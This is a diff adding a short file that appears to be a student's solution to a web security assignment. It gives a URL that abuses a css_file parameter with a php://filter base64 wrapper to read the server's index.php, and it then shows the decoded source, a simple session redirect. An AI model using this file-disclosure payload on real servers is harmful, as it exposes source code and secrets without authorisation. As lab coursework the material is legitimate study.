@@ -1,0 +1,20 @@
+// Please paste the following code in the url
+
+view-source:http://assignment-artemis.unimelb.life/style.php?css_file=php://filter/convert.base64-encode/resource=index.php
+
+// The following are the decoded file content
+
+<?php
+
+session_start();
+session_regenerate_id(true);
+
+if (isset($_SESSION["user"])){
+    header("Location: dashboard.php");
+    exit();
+}else{
+    header("Location: login.php");
+    exit();
+}
+
+?>
